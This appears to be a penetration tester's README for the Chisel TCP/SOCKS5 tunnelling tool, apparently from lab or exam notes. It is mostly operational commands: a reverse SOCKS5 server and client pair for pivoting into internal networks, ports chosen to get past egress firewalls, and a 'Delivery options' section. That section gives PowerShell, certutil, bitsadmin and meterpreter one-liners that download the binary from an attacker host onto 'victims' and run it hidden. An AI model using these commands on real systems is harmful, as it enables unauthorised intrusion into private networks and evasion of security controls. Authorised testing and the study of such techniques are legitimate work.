# Chisel

See the parent `RUNBOOK.md` for full usage. This directory contains configs and notes specific to Chisel.

## What Chisel is

A fast TCP tunnel over HTTP, written in Go. Single binary — runs on Windows, Linux, macOS. Creates a SOCKS5 proxy so you can reach internal network segments.

## Binary locations

```bash
# Kali - these are the binaries you serve to victims
ls /opt/chisel/         # or wherever you store them
# chisel              ← runs on Kali (server mode)
# chisel.exe          ← drops on Windows victims (client mode)
# chisel-linux        ← drops on Linux victims (client mode)
```

## The most common command pair (reverse SOCKS5)

```bash
# KALI — start before anything else
./chisel server --reverse --port 8080 --socks5

# VICTIM (Windows) — run after Kali server is listening
.\chisel.exe client 192.168.45.202:8080 R:socks
```

## proxychains config for Chisel

`/etc/proxychains4.conf`:
```ini
strict_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1 1080
```

## Port selection tips

| Port | When to use |
|------|-------------|
| 8080 | Default, most permissive firewalls allow outbound |
| 443  | When only HTTPS out is allowed |
| 80   | When only HTTP out is allowed |

## Delivery options (getting Chisel onto victim)

```powershell
# PowerShell
(New-Object System.Net.WebClient).DownloadFile("http://KALI/chisel.exe","C:\Windows\Temp\c.exe")
C:\Windows\Temp\c.exe client KALI:8080 R:socks

# Certutil
certutil -urlcache -split -f http://KALI/chisel.exe C:\Windows\Temp\c.exe

# Bitsadmin
bitsadmin /Transfer job http://KALI/chisel.exe C:\Windows\Temp\c.exe

# meterpreter upload
meterpreter> upload /path/to/chisel.exe C:\\Windows\\Temp\\c.exe
meterpreter> execute -f C:\\Windows\\Temp\\c.exe -a "client KALI:8080 R:socks" -H
```
